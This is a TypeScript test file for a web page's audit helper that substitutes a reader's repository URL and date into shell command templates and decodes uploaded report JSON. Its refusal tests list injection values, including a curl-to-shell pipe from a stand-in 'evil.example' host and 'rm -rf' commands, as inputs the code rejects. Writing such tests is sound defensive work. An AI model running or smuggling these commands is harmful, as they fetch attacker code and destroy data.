// Run with: node --test site/src/lib/audit.test.ts
//
// No test framework and nothing new at runtime — Node 23.6+ strips TypeScript types natively and
// `node:test` is built in; the only addition is `@types/node`, which is dev-only and emits no bytes.
// `lib/audit.ts` was split out of the views precisely so it imports nothing from React. That keeps the
// two properties below testable at all — the Python publish gate reads the built bundle's BYTES, so it
// can see that a rule exists in the stylesheet but never that a function refuses what it should refuse.
//
// The command templates in these tests are LOCAL FIXTURES, not the published ones. That is deliberate:
// this file tests the substitution and the refusals, and reading `audit.json` here would make the test
// fail the day the tools gained a flag — which is a change to the payload, not a regression in this
// logic. The published templates are checked elsewhere, by the gate arm that reads the payload.

import assert from "node:assert/strict";
import test from "node:test";
import { compose, decodeReport, obsClass, statusClass } from "./audit.ts";
import type { Composed, Msg } from "./audit.ts";
import type { AuditReport } from "./types.ts";

// This file is type-checked by `tsconfig.test.json` rather than by the app project, which excludes
// `*.test.ts`: it needs `@types/node` and `allowImportingTsExtensions` (Node's type stripping resolves
// `./audit.ts` literally, and will not invent the extension), and the browser bundle needs neither.
// `npm run typecheck` runs both projects, so being outside the app project is not being unchecked —
// an unchecked test is where a vacuous assertion hides.
//
// The three helpers below exist because of that checking, not despite it. `assert.ok(<expression>)`
// narrows nothing: an assertion signature only narrows a reference, so `assert.ok("error" in out)`
// leaves `out` a union and the next line fails to compile. Narrowing with `in` and falling through to
// `assert.fail` — which returns `never` — states the same expectation in a form the checker follows,
// and `at()` keeps `noUncheckedIndexedAccess` on so a missing command line fails loudly here instead
// of being compared as `undefined` inside an assertion that then proves nothing.
function expectError(out: ReturnType<typeof decodeReport>, what: string): Msg {
  if ("error" in out) return out.error;
  assert.fail(`expected a refusal for ${what}, got a decoded report`);
}

function expectReport(out: ReturnType<typeof decodeReport>): AuditReport {
  if ("report" in out) return out.report;
  assert.fail(`expected a decoded report, got a refusal: ${JSON.stringify(out.error)}`);
}

function at(c: Composed, n: number): string {
  const line = c.lines[n];
  if (line === undefined) assert.fail(`no command at index ${n} — composed ${c.lines.length} line(s)`);
  return line;
}

const CMDS = [
  "git clone <your-repo> submission",
  ".venv-oracle/bin/python platform/audit/parse_iac.py --submission submission --out inventory.json",
  ".venv-oracle/bin/python platform/audit/report.py --inventory inventory.json --as-of <YYYY-MM-DD> " +
    "--out-json report.json --out-md report.md",
];

test("an empty form leaves the templates exactly as published", () => {
  const out = compose(CMDS, "", "");
  assert.equal(out.refusal, null);
  assert.equal(out.substituted, false);
  assert.ok(at(out, 0).includes("<your-repo>"), "the placeholder must survive so it can be edited");
});

test("a git URL and a date are substituted at every occurrence", () => {
  const out = compose(CMDS, "git@github.com:acme/infra.git", "2026-08-20");
  assert.equal(out.refusal, null);
  assert.equal(out.substituted, true);
  assert.equal(at(out, 0), "git clone git@github.com:acme/infra.git submission");
  assert.ok(at(out, 2).includes("--as-of 2026-08-20"));
  assert.ok(!out.lines.join("\n").includes("<"), "no placeholder may survive a full substitution");
});

test("a local path with a tilde is accepted", () => {
  const out = compose(CMDS, "~/src/my-infra", "");
  assert.equal(out.refusal, null);
  assert.equal(at(out, 0), "git clone ~/src/my-infra submission");
});

test("an empty date DROPS the flag rather than substituting a clock reading", () => {
  // `report.py` reads no clock: omitting `--as-of` is what makes the same submission produce a
  // byte-identical report. Substituting today's date here would silently destroy that property, and the
  // page has no business knowing the reader's clock either.
  const out = compose(CMDS, "repo", "");
  const third = at(out, 2);
  assert.ok(!third.includes("--as-of"), third);
  assert.ok(!third.includes("<YYYY-MM-DD>"), third);
  assert.ok(third.includes("--out-json report.json"), "only the date flag may be removed");
});

// --------------------------------------------------------------------------- the refusals
//
// These are the reason this file exists. A composed command is text a reader pastes into a shell, so a
// repository field is a command fragment: if the field's contents reached the block unvalidated, the
// page would compose a working attack against its own reader.

test("a shell metacharacter refuses to compose and the template is left alone", () => {
  for (const evil of [
    "repo; curl http://evil.example/x | sh",
    "repo && rm -rf ~",
    "$(id)",
    "`id`",
    "repo\nrm -rf .",
    "a b",
    "repo|tee /tmp/x",
    "repo>out",
    "repo'x'",
    'repo"x"',
    "repo\\x",
    "repo&",
  ]) {
    const out = compose(CMDS, evil, "");
    assert.ok(out.refusal, `composed a command from ${JSON.stringify(evil)}`);
    assert.equal(out.substituted, false);
    assert.deepEqual(out.lines, CMDS, "the templates must be shown unmodified on a refusal");
  }
});

// The refusals are checked by KEY, not by a word in their wording. `includes("hyphen")` would also have
// passed for a sentence that mentioned hyphens while saying the value was accepted, and it would fail the
// day the page was read in Chinese — a refusal is an instruction to the reader, so it has both.
test("a value that would be read as an option refuses too", () => {
  const out = compose(CMDS, "--help", "");
  assert.equal(out.refusal?.key, "aud.refuse.hyphen");
  assert.deepEqual(out.lines, CMDS);
});

test("a space is refused by its own sentence, not quoted into the character one", () => {
  // `JSON.stringify(" ")` is the one character a reader cannot see between quotation marks, so naming it
  // is the whole point of the second key existing.
  assert.equal(compose(CMDS, "my repo", "").refusal?.key, "aud.refuse.space");
  const other = compose(CMDS, "repo;id", "").refusal;
  assert.equal(other?.key, "aud.refuse.char");
  assert.equal(other?.vars?.["ch"], '";"');
});

test("a date that is not an ISO day refuses rather than being pasted in", () => {
  for (const bad of ["yesterday", "20260820", "2026-8-20", "2026-08-20; id"]) {
    const out = compose(CMDS, "repo", bad);
    assert.ok(out.refusal, `accepted ${JSON.stringify(bad)}`);
    assert.deepEqual(out.lines, CMDS);
  }
});

// --------------------------------------------------------------------------- decoding a reader's file

const REPORT = JSON.stringify({
  schema: "grx-audit-report/1",
  controls: [],
  recommendations: [],
});

test("a report with the right schema decodes", () => {
  assert.equal(expectReport(decodeReport(REPORT)).schema, "grx-audit-report/1");
});

test("an inventory.json is refused by name rather than rendered as an empty report", () => {
  // The likely mistake: `inventory.json` sits beside the report, has a similar shape, and would render
  // as a report with every section empty — which reads as "your submission has no problems".
  const err = expectError(
    decodeReport(JSON.stringify({ schema: "grx-inventory/1", observations: [] })),
    "an inventory",
  );
  assert.equal(err.key, "aud.rep.wrongSchema");
  // The schema the file declared has to reach the reader as a value: "this is not a report" without it
  // leaves them guessing which of the two files beside each other they picked.
  assert.equal(err.vars?.["got"], '"grx-inventory/1"');
  assert.equal(err.vars?.["want"], '"grx-audit-report/1"');
});

test("a schema-less object, a JSON array, a JSON scalar and broken JSON are each refused", () => {
  for (const text of ["{}", "[]", "null", "42", '"a string"', "{not json", ""]) {
    expectError(decodeReport(text), JSON.stringify(text));
  }
});

test("the right schema with no arrays is still refused", () => {
  const err = expectError(decodeReport(JSON.stringify({ schema: "grx-audit-report/1" })), "no arrays");
  assert.equal(err.key, "aud.rep.noArrays");
});

// --------------------------------------------------------------------------- the derived class names
//
// Pinned because the publish gate greps the stylesheet for exactly these shapes: if the derivation here
// changed to camelCase or dropped the prefix, every rule in the sheet would still match the gate's regex
// while no badge on the page carried the class. The gate would pass and the styling would be gone.

test("badge classes are derived as the gate expects", () => {
  assert.equal(statusClass("not_measured"), "st-not_measured");
  assert.equal(statusClass("MEASURED_TRUE"), "st-measured_true");
  assert.equal(obsClass("NOT_DECLARED"), "o-not_declared");
  assert.equal(obsClass("DECLARED"), "o-declared");
});
